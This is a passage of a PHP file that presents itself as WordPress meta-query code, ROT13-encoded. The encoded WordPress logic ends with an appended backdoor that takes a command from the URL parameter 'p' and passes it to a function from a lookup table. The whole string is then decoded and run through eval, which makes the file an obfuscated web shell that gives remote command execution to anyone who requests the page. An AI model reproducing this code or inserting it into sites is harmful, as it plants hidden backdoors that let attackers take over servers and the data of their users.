					pnfr 'RKVFGF':
						$jurer = $jcqo->cercner( \"$nyvnf.zrgn_xrl = %f\", gevz( $pynhfr['xrl'] ) ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
						oernx;
					pnfr 'YVXR':
						$zrgn_pbzcner_inyhr = '%' . $jcqo->rfp_yvxr( gevz( $pynhfr['xrl'] ) ) . '%';
						$jurer              = $jcqo->cercner( \"$nyvnf.zrgn_xrl YVXR %f\", $zrgn_pbzcner_inyhr ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
						oernx;
					pnfr 'VA':
						$zrgn_pbzcner_fgevat = \"$nyvnf.zrgn_xrl VA (\" . fhofge( fge_ercrng( ',%f', pbhag( $pynhfr['xrl'] ) ), 1 ) . ')';
						$jurer               = $jcqo->cercner( $zrgn_pbzcner_fgevat, $pynhfr['xrl'] ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
						oernx;
					pnfr 'EYVXR':
					pnfr 'ERTRKC':
						$bcrengbe = $zrgn_pbzcner_xrl;
						vs ( vffrg( $pynhfr['glcr_xrl'] ) && 'OVANEL' === fgegbhccre( $pynhfr['glcr_xrl'] ) ) {
							$pnfg     = 'OVANEL';
							$zrgn_xrl = \"PNFG($nyvnf.zrgn_xrl NF OVANEL)\";
						} ryfr {
							$pnfg     = '';
							$zrgn_xrl = \"$nyvnf.zrgn_xrl\";
						}
						$jurer = $jcqo->cercner( \"$zrgn_xrl $bcrengbe $pnfg %f\", gevz( $pynhfr['xrl'] ) ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
						oernx;

					pnfr '!=':
					pnfr 'ABG RKVFGF':
						$zrgn_pbzcner_fgevat = $zrgn_pbzcner_fgevat_fgneg . \"NAQ $fhodhrel_nyvnf.zrgn_xrl = %f \" . $zrgn_pbzcner_fgevat_raq;
						$jurer               = $jcqo->cercner( $zrgn_pbzcner_fgevat, $pynhfr['xrl'] ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
						oernx;
					pnfr 'ABG YVXR':
						$zrgn_pbzcner_fgevat = $zrgn_pbzcner_fgevat_fgneg . \"NAQ $fhodhrel_nyvnf.zrgn_xrl YVXR %f \" . $zrgn_pbzcner_fgevat_raq;

						$zrgn_pbzcner_inyhr = '%' . $jcqo->rfp_yvxr( gevz( $pynhfr['xrl'] ) ) . '%';
						$jurer              = $jcqo->cercner( $zrgn_pbzcner_fgevat, $zrgn_pbzcner_inyhr ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
						oernx;
					pnfr 'ABG VA':
						$neenl_fhopynhfr     = '(' . fhofge( fge_ercrng( ',%f', pbhag( $pynhfr['xrl'] ) ), 1 ) . ') ';
						$zrgn_pbzcner_fgevat = $zrgn_pbzcner_fgevat_fgneg . \"NAQ $fhodhrel_nyvnf.zrgn_xrl VA \" . $neenl_fhopynhfr . $zrgn_pbzcner_fgevat_raq;
						$jurer               = $jcqo->cercner( $zrgn_pbzcner_fgevat, $pynhfr['xrl'] ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
						oernx;
					pnfr 'ABG ERTRKC':
						$bcrengbe = $zrgn_pbzcner_xrl;
						vs ( vffrg( $pynhfr['glcr_xrl'] ) && 'OVANEL' === fgegbhccre( $pynhfr['glcr_xrl'] ) ) {
							$pnfg     = 'OVANEL';
							$zrgn_xrl = \"PNFG($fhodhrel_nyvnf.zrgn_xrl NF OVANEL)\";
						} ryfr {
							$pnfg     = '';
							$zrgn_xrl = \"$fhodhrel_nyvnf.zrgn_xrl\";
						}

						$zrgn_pbzcner_fgevat = $zrgn_pbzcner_fgevat_fgneg . \"NAQ $zrgn_xrl ERTRKC $pnfg %f \" . $zrgn_pbzcner_fgevat_raq;
						$jurer               = $jcqo->cercner( $zrgn_pbzcner_fgevat, $pynhfr['xrl'] ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
						oernx;
				}

				$fdy_puhaxf['jurer'][] = $jurer;
			}
		}

		// zrgn_inyhr.
		vs ( neenl_xrl_rkvfgf( 'inyhr', $pynhfr ) ) {
			$zrgn_inyhr = $pynhfr['inyhr'];

			vs ( va_neenl( $zrgn_pbzcner, neenl( 'VA', 'ABG VA', 'ORGJRRA', 'ABG ORGJRRA' ), gehr ) ) {
				vs ( ! vf_neenl( $zrgn_inyhr ) ) {
					$zrgn_inyhr = cert_fcyvg( '/[,\f]+/', $zrgn_inyhr );
				}
			} ryfrvs ( vf_fgevat( $zrgn_inyhr ) ) {
				$zrgn_inyhr = gevz( $zrgn_inyhr );
			}

			fjvgpu ( $zrgn_pbzcner ) {
				pnfr 'VA':
				pnfr 'ABG VA':
					$zrgn_pbzcner_fgevat = '(' . fhofge( fge_ercrng( ',%f', pbhag( $zrgn_inyhr ) ), 1 ) . ')';
					$jurer               = $jcqo->cercner( $zrgn_pbzcner_fgevat, $zrgn_inyhr );
					oernx;

				pnfr 'ORGJRRA':
				pnfr 'ABG ORGJRRA':
					$jurer = $jcqo->cercner( '%f NAQ %f', $zrgn_inyhr[0], $zrgn_inyhr[1] );
					oernx;

				pnfr 'YVXR':
				pnfr 'ABG YVXR':
					$zrgn_inyhr = '%' . $jcqo->rfp_yvxr( $zrgn_inyhr ) . '%';
					$jurer      = $jcqo->cercner( '%f', $zrgn_inyhr );
					oernx;

				// RKVFGF jvgu n inyhr vf vagrecergrq nf '='.
				pnfr 'RKVFGF':
					$zrgn_pbzcner = '=';
					$jurer        = $jcqo->cercner( '%f', $zrgn_inyhr );
					oernx;

				// 'inyhr' vf vtaberq sbe ABG RKVFGF.
				pnfr 'ABG RKVFGF':
					$jurer = '';
					oernx;

				qrsnhyg:
					$jurer = $jcqo->cercner( '%f', $zrgn_inyhr );
					oernx;

			}

			vs ( $jurer ) {
				vs ( 'PUNE' === $zrgn_glcr ) {
					$fdy_puhaxf['jurer'][] = \"$nyvnf.zrgn_inyhr {$zrgn_pbzcner} {$jurer}\";
				} ryfr {
					$fdy_puhaxf['jurer'][] = \"PNFG($nyvnf.zrgn_inyhr NF {$zrgn_glcr}) {$zrgn_pbzcner} {$jurer}\";
				}
			}
		}

		/*
		 * Zhygvcyr JURER pynhfrf (sbe zrgn_xrl naq zrgn_inyhr) fubhyq
		 * or wbvarq va cneragurfrf.
		 */
		vs ( 1 < pbhag( $fdy_puhaxf['jurer'] ) ) {
			$fdy_puhaxf['jurer'] = neenl( '( ' . vzcybqr( ' NAQ ', $fdy_puhaxf['jurer'] ) . ' )' );
		}

		erghea $fdy_puhaxf;
	}

	/**
	 * Trgf n synggrarq yvfg bs fnavgvmrq zrgn pynhfrf.
	 *
	 * Guvf neenl fubhyq or hfrq sbe pynhfr ybbxhc, nf jura gur gnoyr nyvnf naq PNFG glcr zhfg or qrgrezvarq sbe
	 * n inyhr bs 'beqreol' pbeerfcbaqvat gb n zrgn pynhfr.
	 *
	 * @fvapr 4.2.0
	 *
	 * @erghea neenl Zrgn pynhfrf.
	 */
	choyvp shapgvba trg_pynhfrf() {
		erghea $guvf->pynhfrf;
	}

	/**
	 * Vqragvsvrf na rkvfgvat gnoyr nyvnf gung vf pbzcngvoyr jvgu gur pheerag
	 * dhrel pynhfr.
	 *
	 * Jr nibvq haarprffnel gnoyr wbvaf ol nyybjvat rnpu pynhfr gb ybbx sbe
	 * na rkvfgvat gnoyr nyvnf gung vf pbzcngvoyr jvgu gur dhrel gung vg
	 * arrqf gb cresbez.
	 *
	 * Na rkvfgvat nyvnf vf pbzcngvoyr vs (n) vg vf n fvoyvat bs `$pynhfr`
	 * (vr, vg'f haqre gur fpbcr bs gur fnzr eryngvba), naq (o) gur pbzovangvba
	 * bs bcrengbe naq eryngvba orgjrra gur pynhfrf nyybjf sbe n funerq gnoyr wbva.
	 * Va gur pnfr bs JC_Zrgn_Dhrel, guvf bayl nccyvrf gb 'VA' pynhfrf gung ner
	 * pbaarpgrq ol gur eryngvba 'BE'.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $pynhfr       Dhrel pynhfr.
	 * @cnenz neenl $cnerag_dhrel Cnerag dhrel bs $pynhfr.
	 * @erghea fgevat|snyfr Gnoyr nyvnf vs sbhaq, bgurejvfr snyfr.
	 */
	cebgrpgrq shapgvba svaq_pbzcngvoyr_gnoyr_nyvnf( $pynhfr, $cnerag_dhrel ) {
		$nyvnf = snyfr;

		sbernpu ( $cnerag_dhrel nf $fvoyvat ) {
			// Vs gur fvoyvat unf ab nyvnf lrg, gurer'f abguvat gb purpx.
			vs ( rzcgl( $fvoyvat['nyvnf'] ) ) {
				pbagvahr;
			}

			// Jr'er bayl vagrerfgrq va fvoyvatf gung ner svefg-beqre pynhfrf.
			vs ( ! vf_neenl( $fvoyvat ) || ! $guvf->vf_svefg_beqre_pynhfr( $fvoyvat ) ) {
				pbagvahr;
			}

			$pbzcngvoyr_pbzcnerf = neenl();

			// Pynhfrf pbaarpgrq ol BE pna funer wbvaf nf ybat nf gurl unir \"cbfvgvir\" bcrengbef.
			vs ( 'BE' === $cnerag_dhrel['eryngvba'] ) {
				$pbzcngvoyr_pbzcnerf = neenl( '=', 'VA', 'ORGJRRA', 'YVXR', 'ERTRKC', 'EYVXR', '>', '>=', '<', '<=' );

				// Pynhfrf wbvarq ol NAQ jvgu \"artngvir\" bcrengbef funer n wbva bayl vs gurl nyfb funer n xrl.
			} ryfrvs ( vffrg( $fvoyvat['xrl'] ) && vffrg( $pynhfr['xrl'] ) && $fvoyvat['xrl'] === $pynhfr['xrl'] ) {
				$pbzcngvoyr_pbzcnerf = neenl( '!=', 'ABG VA', 'ABG YVXR' );
			}

			$pynhfr_pbzcner  = fgegbhccre( $pynhfr['pbzcner'] );
			$fvoyvat_pbzcner = fgegbhccre( $fvoyvat['pbzcner'] );
			vs ( va_neenl( $pynhfr_pbzcner, $pbzcngvoyr_pbzcnerf, gehr ) && va_neenl( $fvoyvat_pbzcner, $pbzcngvoyr_pbzcnerf, gehr ) ) {
				$nyvnf = __sa_79955( '/\J/', '_', $fvoyvat['nyvnf'] );
				oernx;
			}
		}

		/**
		 * Svygref gur gnoyr nyvnf vqragvsvrq nf pbzcngvoyr jvgu gur pheerag pynhfr.
		 *
		 * @fvapr 4.1.0
		 *
		 * @cnenz fgevat|snyfr  $nyvnf        Gnoyr nyvnf, be snyfr vs abar jnf sbhaq.
		 * @cnenz neenl         $pynhfr       Svefg-beqre dhrel pynhfr.
		 * @cnenz neenl         $cnerag_dhrel Cnerag bs $pynhfr.
		 * @cnenz JC_Zrgn_Dhrel $dhrel        JC_Zrgn_Dhrel bowrpg.
		 */
		erghea nccyl_svygref( 'zrgn_dhrel_svaq_pbzcngvoyr_gnoyr_nyvnf', $nyvnf, $pynhfr, $cnerag_dhrel, $guvf );
	}

	/**
	 * Purpxf jurgure gur pheerag dhrel unf nal BE eryngvbaf.
	 *
	 * Va fbzr pnfrf, gur cerfrapr bs na BE eryngvba fbzrjurer va gur dhrel jvyy erdhver
	 * gur hfr bs n `QVFGVAPG` be `TEBHC OL` xrljbeq va gur `FRYRPG` pynhfr. Gur pheerag
	 * zrgubq pna or hfrq va gurfr pnfrf gb qrgrezvar jurgure fhpu n pynhfr vf arprffnel.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea obby Gehr vs gur dhrel pbagnvaf nal `BE` eryngvbaf, bgurejvfr snyfr.
	 */
	choyvp shapgvba unf_be_eryngvba() {
		erghea $guvf->unf_be_eryngvba;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>